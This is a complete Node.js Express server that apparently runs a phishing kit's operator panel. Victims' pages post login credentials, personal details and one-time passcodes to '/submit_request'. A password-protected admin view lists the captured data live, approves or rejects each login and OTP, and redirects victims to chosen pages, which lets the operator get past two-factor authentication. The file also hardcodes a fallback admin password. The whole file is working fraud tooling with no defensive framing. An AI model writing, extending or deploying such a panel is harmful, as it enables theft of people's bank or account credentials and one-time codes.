const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const ADMIN_PASS = process.env.ADMIN_PASS || 'Ha09876@@';

// ── In-memory storage ───────────────────────────────────────
const sessions = new Map();
const visits = new Map();
const adminSessions = new Set();

// ── Session cookie helpers ──────────────────────────────────
function parseCookies(req) {
  const cookies = {};
  (req.headers.cookie || '').split(';').forEach(c => {
    const [k, v] = c.trim().split('=');
    if (k) cookies[k] = v;
  });
  return cookies;
}

function isAdminLoggedIn(req) {
  const cookies = parseCookies(req);
  return cookies.session && adminSessions.has(cookies.session);
}

// ── Admin auth ──────────────────────────────────────────────
app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-login.html'));
});

app.post('/admin/login', (req, res) => {
  if (req.body.password === ADMIN_PASS) {
    const token = crypto.randomBytes(16).toString('hex');
    adminSessions.add(token);
    res.setHeader('Set-Cookie', `session=${token}; HttpOnly; Path=/`);
    return res.redirect('/admin');
  }
  res.redirect('/admin/login?error=1');
});

app.get('/admin/logout', (req, res) => {
  const cookies = parseCookies(req);
  if (cookies.session) adminSessions.delete(cookies.session);
  res.setHeader('Set-Cookie', 'session=; HttpOnly; Path=/; Max-Age=0');
  res.redirect('/admin/login');
});

app.get('/admin', (req, res) => {
  if (!isAdminLoggedIn(req)) return res.redirect('/admin/login');
  res.sendFile(path.join(__dirname, 'admin-panel.html'));
});

// ── Visitor tracking ────────────────────────────────────────
app.post('/track_visit', (req, res) => {
  const { session_id, current_page, country, ip_address } = req.body;
  if (!session_id) return res.status(400).json({ error: 'missing session_id' });
  visits.set(session_id, {
    session_id,
    current_page: current_page || 'unknown',
    country: country || 'غير معروف',
    ip_address: ip_address || req.ip,
    last_seen: Date.now()
  });
  res.json({ ok: true });
});

// ── Submit request (login/personal info/otp) ────────────────
app.post('/submit_request', (req, res) => {
  const { session_id, type, data } = req.body;
  if (!session_id) return res.status(400).json({ error: 'missing session_id' });

  let session = sessions.get(session_id);
  if (!session) {
    const visit = visits.get(session_id) || {};
    session = {
      session_id,
      data: {},
      login_status: null,
      otp_status: null,
      redirect_target: null,
      country: visit.country || req.body.country || 'غير معروف',
      ip_address: visit.ip_address || req.ip,
      current_page: visit.current_page || 'unknown',
      last_activity: new Date().toISOString()
    };
  }

  if (data) Object.assign(session.data, data);

  if (type === 'login') session.login_status = 'pending';
  if (type === 'otp') session.otp_status = 'pending';

  session.last_activity = new Date().toISOString();
  if (req.body.current_page) session.current_page = req.body.current_page;

  sessions.set(session_id, session);
  res.json({ ok: true });
});

// ── Check status (polled by visitor pages) ──────────────────
app.get('/check_status/:session_id', (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.json({ login_status: null, otp_status: null, redirect_target: null });
  const result = {
    login_status: session.login_status,
    otp_status: session.otp_status,
    redirect_target: session.redirect_target
  };
  if (session.redirect_target) session.redirect_target = null;
  res.json(result);
});

// ── Admin API (protected) ───────────────────────────────────
function adminOnly(req, res, next) {
  if (!isAdminLoggedIn(req)) return res.status(401).json({ error: 'unauthorized' });
  next();
}

app.get('/admin/active_visits', adminOnly, (req, res) => {
  const now = Date.now();
  const active = [];
  visits.forEach((v, id) => {
    if (now - v.last_seen < 60000) active.push(v);
    else visits.delete(id);
  });
  res.json(active);
});

app.get('/admin/all_requests', adminOnly, (req, res) => {
  const list = Array.from(sessions.values()).sort((a, b) =>
    new Date(b.last_activity) - new Date(a.last_activity)
  );
  res.json(list);
});

app.get('/admin/request_details/:session_id', adminOnly, (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.status(404).json({ error: 'not found' });
  res.json(session);
});

app.get('/admin/approve_login/:session_id', adminOnly, (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.status(404).json({ error: 'not found' });
  session.login_status = 'approved';
  res.json({ ok: true });
});

app.get('/admin/reject_login/:session_id', adminOnly, (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.status(404).json({ error: 'not found' });
  session.login_status = 'rejected';
  res.json({ ok: true });
});

app.get('/admin/approve_otp/:session_id', adminOnly, (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.status(404).json({ error: 'not found' });
  session.otp_status = 'approved';
  res.json({ ok: true });
});

app.get('/admin/reject_otp/:session_id', adminOnly, (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.status(404).json({ error: 'not found' });
  session.otp_status = 'rejected';
  res.json({ ok: true });
});

app.post('/admin/redirect_user/:session_id', adminOnly, (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) return res.status(404).json({ error: 'not found' });
  session.redirect_target = req.body.target_page || null;
  res.json({ ok: true });
});

// ── Static files ────────────────────────────────────────────
app.use(express.static(path.join(__dirname), {
  extensions: ['html'],
  index: 'index.html'
}));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
